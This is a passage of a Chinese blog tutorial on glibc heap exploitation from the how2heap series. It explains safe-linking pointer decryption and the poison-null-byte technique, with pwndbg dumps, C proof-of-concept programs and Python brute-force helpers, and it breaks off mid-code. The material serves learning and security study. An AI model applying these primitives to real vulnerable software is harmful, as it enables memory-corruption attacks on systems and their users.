</span><br><span class="line">            unsortbin: 0x0</span><br><span class="line">(0x20)   tcache_entry[0](7): 0x555555757360 --&gt; 0x555555757340 --&gt; 0x555555757320 --&gt; 0x555555757300 --&gt; 0x5555557572e0 --&gt; 0x5555557572c0 --&gt; 0x5555557572a0</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/4gx a1-0x10</span><br><span class="line">0x555555757370: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x555555757380: 0x0000000555555757      0x0000000000000000</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/4gx a2-0x10</span><br><span class="line">0x555555757390: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x5555557573a0: 0x0000555000202427      0x0000000000000000</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/4gx a3-0x10</span><br><span class="line">0x5555557573b0: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x5555557573c0: 0x00005550002024c7      0x0000000000000000</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a1-&gt;fd：</span><br><span class="line">(&amp;a1-&gt;fd&gt;&gt;12)^(*fb)=(0x555555757380&gt;&gt;12)^0=0x555555757</span><br><span class="line">a2-&gt;fd：</span><br><span class="line">(&amp;a2-&gt;fd&gt;&gt;12)^(*fb)=(0x5555557573a0&gt;&gt;12)^0x555555757370=0x555000202427</span><br><span class="line">a3-&gt;fd：</span><br><span class="line">(&amp;a3-&gt;fd&gt;&gt;12)^(*fb)=(0x5555557573c0&gt;&gt;12)^0x555555757390=0x5550002024c7</span><br></pre></td></tr></table></figure>
<p>解密也是一样的。<br>这样也注意到一点，只有当它们在同一内存页上的时候，计算才能正确。而如果不在统一内存页上，就可能会解密失败，需要花点力气暴力破解。</p>
<h3 id="POC-9"><a href="#POC-9" class="headerlink" title="POC"></a>POC</h3><p>how2heap源码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">long</span> cipher)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"The decryption uses the fact that the first 12bit of the plaintext (the fwd pointer) is known,"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"because of the 12bit sliding."</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"And the key, the ASLR value, is the same with the leading bits of the plaintext (the fwd pointer)"</span>);</span><br><span class="line">	<span class="keyword">long</span> key = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">long</span> plain;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;<span class="number">6</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">int</span> bits = <span class="number">64</span><span class="number">-12</span>*i;</span><br><span class="line">		<span class="keyword">if</span>(bits &lt; <span class="number">0</span>) bits = <span class="number">0</span>;</span><br><span class="line">		plain = ((cipher ^ key) &gt;&gt; bits) &lt;&lt; bits;</span><br><span class="line">		key = plain &gt;&gt; <span class="number">12</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"round %d:\n"</span>, i);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"key:    %#016lx\n"</span>, key);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"plain:  %#016lx\n"</span>, plain);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"cipher: %#016lx\n\n"</span>, cipher);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> plain;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * This technique demonstrates how to recover the original content from a poisoned</span></span><br><span class="line"><span class="comment">	 * value because of the safe-linking mechanism.</span></span><br><span class="line"><span class="comment">	 * The attack uses the fact that the first 12 bit of the plaintext (pointer) is known</span></span><br><span class="line"><span class="comment">	 * and the key (ASLR slide) is the same to the pointer's leading bits.</span></span><br><span class="line"><span class="comment">	 * As a result, as long as the chunk where the pointer is stored is at the same page</span></span><br><span class="line"><span class="comment">	 * of the pointer itself, the value of the pointer can be fully recovered.</span></span><br><span class="line"><span class="comment">	 * Otherwise, a little bit of bruteforce is required.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"></span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step 1: allocate chunks</span></span><br><span class="line">	<span class="keyword">long</span> *a = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">	<span class="keyword">long</span> *b = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"First, we create chunk a @ %p and chunk b @ %p\n"</span>, a, b);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"And then create a padding chunk to prevent consolidation."</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// step 2: free chunks</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Now free chunk a and then free chunk b."</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the freelist is: [%p -&gt; %p]\n"</span>, b, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Due to safe-linking, the value actually stored at b[0] is: %#lx\n"</span>, b[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step 3: recover the values</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Now decrypt the poisoned value"</span>);</span><br><span class="line">	<span class="keyword">long</span> plaintext = decrypt(b[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"value: %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"recovered value: %#lx\n"</span>, plaintext);</span><br><span class="line">	assert(plaintext == (<span class="keyword">long</span>)a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>简化版本：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="keyword">size_t</span> decrypt(<span class="keyword">size_t</span> enc)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">size_t</span> p,bits,key = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;<span class="number">6</span>; i++) &#123;</span><br><span class="line">		bits = <span class="number">64</span><span class="number">-12</span>*i;</span><br><span class="line">		p = ((enc ^ key) &gt;&gt; bits) &lt;&lt; bits;</span><br><span class="line">		key = p &gt;&gt; <span class="number">12</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">	<span class="keyword">size_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	assert( decrypt(b[<span class="number">0</span>]) == (<span class="keyword">size_t</span>)a );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="pwndbg调试-7"><a href="#pwndbg调试-7" class="headerlink" title="pwndbg调试"></a>pwndbg调试</h3><p>在原理部分其实已经很清晰了，解密算法只是用C重新写了一遍。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">enc = ptr^(pos&gt;&gt;12)</span><br><span class="line">ptr = enc^(pos&gt;&gt;12)</span><br><span class="line">(pos&gt;&gt;12) == (ptr&gt;&gt;12)//同一页</span><br><span class="line">ptr = enc^(ptr&gt;&gt;12)</span><br><span class="line">ptr^(ptr&gt;&gt;12)=enc</span><br></pre></td></tr></table></figure></p>
<p>利用这个解密需要利用 double free、uaf等漏洞泄露 chunk 地址。</p>
<h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>上面提到，如果链表头和 fd 指针的地址不在内存的同一页就可能会导致解密失败，需要用暴力破解的方式解密。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(enc)</span>:</span></span><br><span class="line">    bits = [<span class="number">52</span>, <span class="number">40</span>, <span class="number">28</span>, <span class="number">16</span>, <span class="number">4</span>]</span><br><span class="line">    key = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        p = ((enc ^ key) &gt;&gt; bits[i]) &lt;&lt; bits[i]</span><br><span class="line">        key = p &gt;&gt; <span class="number">12</span></span><br><span class="line">    <span class="keyword">return</span> hex(p)</span><br><span class="line"></span><br><span class="line">p = <span class="number">0x000055555555a2a0</span></span><br><span class="line">enc = p ^ (<span class="number">0x000055555555a110</span> &gt;&gt; <span class="number">12</span>)</span><br><span class="line">print(hex(enc))</span><br><span class="line">print(decrypt(enc))</span><br><span class="line"><span class="comment">#0x55500000f7fa</span></span><br><span class="line"><span class="comment">#0x55555555a2a0</span></span><br></pre></td></tr></table></figure></p>
<p>设置不同页的pos的解密程序：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(enc)</span>:</span></span><br><span class="line">    bits = [<span class="number">52</span>, <span class="number">40</span>, <span class="number">28</span>, <span class="number">16</span>, <span class="number">4</span>]</span><br><span class="line">    key = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        p = (enc ^ key) &gt;&gt; bits[i] &lt;&lt; bits[i]</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">3</span>) <span class="keyword">or</span> (i == <span class="number">4</span>):</span><br><span class="line">            key = p &gt;&gt; <span class="number">12</span></span><br><span class="line">            key += <span class="number">0x10</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            key = p &gt;&gt; <span class="number">12</span></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x000055555555a2a0</span></span><br><span class="line">pos = ptr+<span class="number">7</span>*<span class="number">4096</span></span><br><span class="line"><span class="keyword">print</span> hex(pos)</span><br><span class="line">enc = ptr ^ (pos &gt;&gt; <span class="number">12</span>)</span><br><span class="line">plain = decrypt(enc)</span><br><span class="line"><span class="keyword">print</span> hex(plain)</span><br></pre></td></tr></table></figure></p>
<p>在还原到第四组偏移（18bit）的时候，原pos该三位是x6x，ptr这三位是x5x，所以需要加0x10来还原。从这一组之后，每一组都要做相同操作，因为新的key会覆盖修改过的key。<br>所以暴力破解其他位数的时候，每一组偏移都要尝试加减 1-F的数值测试。</p>
<h1 id="how2heap深入浅出学习堆利用（三）"><a href="#how2heap深入浅出学习堆利用（三）" class="headerlink" title="how2heap深入浅出学习堆利用（三）"></a>how2heap深入浅出学习堆利用（三）</h1><h2 id="poison-null-byte-glibc2-34"><a href="#poison-null-byte-glibc2-34" class="headerlink" title="poison_null_byte_glibc2.34"></a>poison_null_byte_glibc2.34</h2><h3 id="原理-10"><a href="#原理-10" class="headerlink" title="原理"></a>原理</h3><p>伪造一个fake_chunk，并修改物理相邻的下一个chunk的prev_inuse位为0，引起合并与unlink，最后再申请的时候就会从这一块合并的chunk中切割，overlap这一块chunk。<br>注意unlink的时候的检查就好，具体可以看上面unsafe unlink这篇文章。就是下面这两个东西：</p>
<ol>
<li>chunk size是否等于 next chunk 的 prev_size</li>
<li>FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P。<br>伪造 chunk 的时候要修改好这两个指针和 prev_size，prev_inuse 位。</li>
</ol>
<p>有的文章说不能在有 tcache bin下运行，但其实这不是问题的主要因素。因为这只是一类技术的名称，把 size 扩大到 large bin size，就不会有 tcache bin 什么事了。</p>
<h3 id="POC-10"><a href="#POC-10" class="headerlink" title="POC"></a>POC</h3><p>how2heap源码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Welcome to poison null byte!"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Tested in Ubuntu 20.04 64bit."</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"This technique can be used when you have an off-by-one into a malloc'ed region with a null byte."</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Some of the implementation details are borrowed from https://github.com/StarCross-Tech/heap_exploit_2.31/blob/master/off_by_null.c\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step1: allocate padding</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Step1: allocate a large padding so that the fake chunk's addresses's lowest 2nd byte is \\x00"</span>);</span><br><span class="line">	<span class="keyword">void</span> *tmp = <span class="built_in">malloc</span>(<span class="number">0x1</span>);</span><br><span class="line">	<span class="keyword">void</span> *heap_base = (<span class="keyword">void</span> *)((<span class="keyword">long</span>)tmp &amp; (~<span class="number">0xfff</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"heap address: %p\n"</span>, heap_base);</span><br><span class="line">	<span class="keyword">size_t</span> size = <span class="number">0x10000</span> - ((<span class="keyword">long</span>)tmp&amp;<span class="number">0xffff</span>) - <span class="number">0x20</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Calculate padding chunk size: 0x%lx\n"</span>, size);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Allocate the padding. This is required to avoid a 4-bit bruteforce because we are going to overwrite least significant two bytes."</span>);</span><br><span class="line">	<span class="keyword">void</span> *padding= <span class="built_in">malloc</span>(size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step2: allocate prev chunk and victim chunk</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"\nStep2: allocate two chunks adjacent to each other."</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Let's call the first one 'prev' and the second one 'victim'."</span>);</span><br><span class="line">	<span class="keyword">void</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">	<span class="keyword">void</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"malloc(0x10) to avoid consolidation"</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"prev chunk: malloc(0x500) = %p\n"</span>, prev);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"victim chunk: malloc(0x4f0) = %p\n"</span>, victim);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step3: link prev into largebin</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"\nStep3: Link prev into largebin"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"This step is necessary for us to forge a fake chunk later"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"The fd_nextsize of prev and bk_nextsize of prev will be the fd and bck pointers of the fake chunk"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"allocate a chunk 'a' with size a little bit smaller than prev's"</span>);</span><br><span class="line">	<span class="keyword">void</span> *a = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"a: malloc(0x4f0) = %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"malloc(0x10) to avoid consolidation"</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"allocate a chunk 'b' with size a little bit larger than prev's"</span>);</span><br><span class="line">	<span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x510</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"b: malloc(0x510) = %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"malloc(0x10) to avoid consolidation"</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Now free a, b, prev"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	<span class="built_in">free</span>(prev);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Allocate a huge chunk to enable sorting"</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"This will add a, b and prev to largebin\nNow prev is in largebin"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The fd_nextsize of prev points to a: %p\n"</span>, ((<span class="keyword">void</span> **)prev)[<span class="number">2</span>]+<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The bk_nextsize of prev points to b: %p\n"</span>, ((<span class="keyword">void</span> **)prev)[<span class="number">3</span>]+<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step4: allocate prev again to construct fake chunk</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"\nStep4: Allocate prev again to construct the fake chunk"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Since large chunk is sorted by size and a's size is smaller than prev's,"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"we can allocate 0x500 as before to take prev out"</span>);</span><br><span class="line">	<span class="keyword">void</span> *prev2 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"prev2: malloc(0x500) = %p\n"</span>, prev2);</span><br><span class="line">	assert(prev == prev2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"The fake chunk is contained in prev and the size is smaller than prev's size by 0x10"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"So set its size to 0x501 (0x510-0x10 | flag)"</span>);</span><br><span class="line">	((<span class="keyword">long</span> *)prev)[<span class="number">1</span>] = <span class="number">0x501</span>;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"And set its prev_size(next_chunk) to 0x500 to bypass the size==prev_size(next_chunk) check"</span>);</span><br><span class="line">	*(<span class="keyword">long</span> *)(prev + <span class="number">0x500</span>) = <span class="number">0x500</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The fake chunk should be at: %p\n"</span>, prev + <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step5: bypass unlinking</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"\nStep5: Manipulate residual pointers to bypass unlinking later."</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Take b out first by allocating 0x510"</span>);</span><br><span class="line">	<span class="keyword">void</span> *b2 = <span class="built_in">malloc</span>(<span class="number">0x510</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Because of the residual pointers in b, b-&gt;fd points to a right now: %p\n"</span>, ((<span class="keyword">void</span> **)b2)[<span class="number">0</span>]+<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We can overwrite the least significant two bytes to make it our fake chunk.\n"</span></span><br><span class="line">			<span class="string">"If the lowest 2nd byte is not \\x00, we need to guess what to write now\n"</span>);</span><br><span class="line">	((char*)b2)[0] = '\x10';</span><br><span class="line">	((char*)b2)[1] = '\x00';</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"After the overwrite, b-&gt;fd is: %p, which is the chunk pointer to our fake chunk\n"</span>, ((<span class="keyword">void</span> **)b2)[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"To do the same to a, we can move it to unsorted bin first"</span></span><br><span class="line">			<span class="string">"by taking it out from largebin and free it into unsortedbin"</span>);</span><br><span class="line">	<span class="keyword">void</span> *a2 = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line">	<span class="built_in">free</span>(a2);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Now free victim into unsortedbin so that a-&gt;bck points to victim"</span>);</span><br><span class="line">	<span class="built_in">free</span>(victim);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"a-&gt;bck: %p, victim: %p\n"</span>, ((<span class="keyword">void</span> **)a)[<span class="number">1</span>], victim);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Again, we take a out and overwrite a-&gt;bck to fake chunk"</span>);</span><br><span class="line">	<span class="keyword">void</span> *a3 = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line">	((char*)a3)[8] = '\x10';</span><br><span class="line">	((char*)a3)[9] = '\x00';</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"After the overwrite, a-&gt;bck is: %p, which is the chunk pointer to our fake chunk\n"</span>, ((<span class="keyword">void</span> **)a3)[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step6: add fake chunk into unsorted bin by off-by-null</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"\nStep6: Use backward consolidation to add fake chunk into unsortedbin"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Take victim out from unsortedbin"</span>);</span><br><span class="line">	<span class="keyword">void</span> *victim2 = <span class="built_in">malloc</span>(<span 